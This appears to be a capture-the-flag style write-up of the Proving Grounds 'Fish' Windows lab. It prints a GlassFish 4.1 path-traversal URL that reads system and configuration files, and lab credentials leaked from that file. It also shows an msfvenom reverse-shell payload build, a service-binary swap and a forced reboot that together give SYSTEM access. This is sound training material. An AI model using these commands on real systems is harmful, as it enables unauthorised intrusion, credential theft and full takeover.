---
title: "PG Practice - Fish"
date: 2026-06-26
draft: false
tags: ["Proving Grounds Practice", "Windows", "Write-Up"]
cover:
    image: "/images/writeup_screens/pg_fish/pg_fish_cover.svg"      
    alt: "Cover"
    relative: true     
ShowToc: false
---

**Box Details**

|   |   |
|---|---|
| a | a |
| Difficulty | Intermediate |
| Type | Windows |

**Port Scan**
```
└─$ nmap -sV -sC -p- 192.168.216.168
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 +0200
Nmap scan report for 192.168.216.168
Host is up (0.043s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FISHYYY
|   NetBIOS_Domain_Name: FISHYYY
|   NetBIOS_Computer_Name: FISHYYY
|   DNS_Domain_Name: Fishyyy
|   DNS_Computer_Name: Fishyyy
|   Product_Version: 10.0.19041
|_  System_Time: 2021-10-29T11:56:13+00:00
| ssl-cert: Subject: commonName=Fishyyy
| Not valid before: 2021-10-28T11:48:50
|_Not valid after:  2022-04-29T11:48:50
|_ssl-date: 2021-10-29T11:56:26+00:00; -4y240d05h38m29s from scanner time.
3700/tcp  open  giop
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     169.254.240.58
|     169.254.240.58
|_    default
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-title: Login
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Fri, 29 Oct 2021 11:53:47 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Fri, 29 Oct 2021 11:53:48 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Fri, 29 Oct 2021 11:53:42 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didn't go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
7680/tcp  open  pando-pub?
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Data Web
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
8181/tcp  open  ssl/intermapper?
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2014-08-21T13:30:10
|_Not valid after:  2024-08-18T13:30:10
|_ssl-date: TLS randomness does not represent time
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.240.58:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
```


**GlassFish Server Open Source Edition  4.1** running on port **4848** is vulnerable to LFI. This [public exploit](https://www.exploit-db.com/exploits/39441) works and with the following URL we can read _win.ini_:

```
http://192.168.216.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
```

![](/images/writeup_screens/pg_fish/pg_fish1.png)

On port **6060** a **SynaMan 5.1** instance is running. Through a short online research i found out that the path to the application configuration is _C:\SynaMan\config\AppConfig.xml_. I tried to access this file with the LFI vulnerability in the **Glassfish** instance: 

```
http://192.168.216.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml
```

![](/images/writeup_screens/pg_fish/pg_fish2.png)

In the file we can find some SMPT clear-text credentials:

```
arthur:KingOfAtlantis
```

I tried to connect to the target via RDP using these credentials which was successful: 

```
└─$ xfreerdp3 /v:192.168.216.168 /u:arthur /p:KingOfAtlantis +clipboard /cert:ignore /dynamic-resolution
```

In the RDP session i could simply read _local.txt_ on the desktop. 

--- 

## Root

I was looking for non-default running services in order to perform Windows binary hijacking. I found a **GlassFish** domain service which looked interesting:

```
> Get-CimInstance -ClassName win32_service | Select Name,State,StartName,PathName | Where-Object {$_.State -like 'Running'}
```

![](/images/writeup_screens/pg_fish/pg_fish3.png)

Looking at the file permissions we can see that any authenticated user is able to modify the binary: 

```
> icacls C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
```

![](/images/writeup_screens/pg_fish/pg_fish4.png)

The start mode of the binary is _auto_ which means it automatically starts when booting the machine: 

```
> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'domain1'}
```

![](/images/writeup_screens/pg_fish/pg_fish5.png)

Our user has the _SeShutdownPrivilege_ which means we are privileged to reboot the machine: 

```
> whoami /priv
```

![](/images/writeup_screens/pg_fish/pg_fish6.png)

We have all preconditions met to be able to perform service binary hijacking. We now have to create a EXE payload: 

```
└─$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=192.168.45.159 LPORT=4444 -f exe -o exploit.exe
```

After transfering it to our target we have to replace the vulnerable binary with our _exploit.exe_:

```
PS C:\Program Files (x86)\TotalAV> move C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe C:\Users\arthur\Documents\

PS C:\Program Files (x86)\TotalAV> move C:\Users\arthur\exploit.exe C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
```

Now we only have to start a netcat listener in our kali and reboot the target:

```
shutdown /r /t 0
```

After a few seconds I received a _SYSTEM_ reverse shell in my listener and could read _C:\Users\Administrator\Desktop\proof.txt_.

> I later found out that the privilege escalation vector described here wasn't the intended way. The installed **TotalAV** version was vulnerable to a malicious DLL quarantine attack as described [here](https://www.exploit-db.com/exploits/47897). However, in my case, **TotalAV** was expired so I couldn't quarantine anything and thus the intended way wouldn't have worked. After resetting the machine, **TotalAV** was functional as the window showed _expiring in 6 days_. I assume there was an error when generating my target instance the first time as I could've followed the intended path only after a reset.  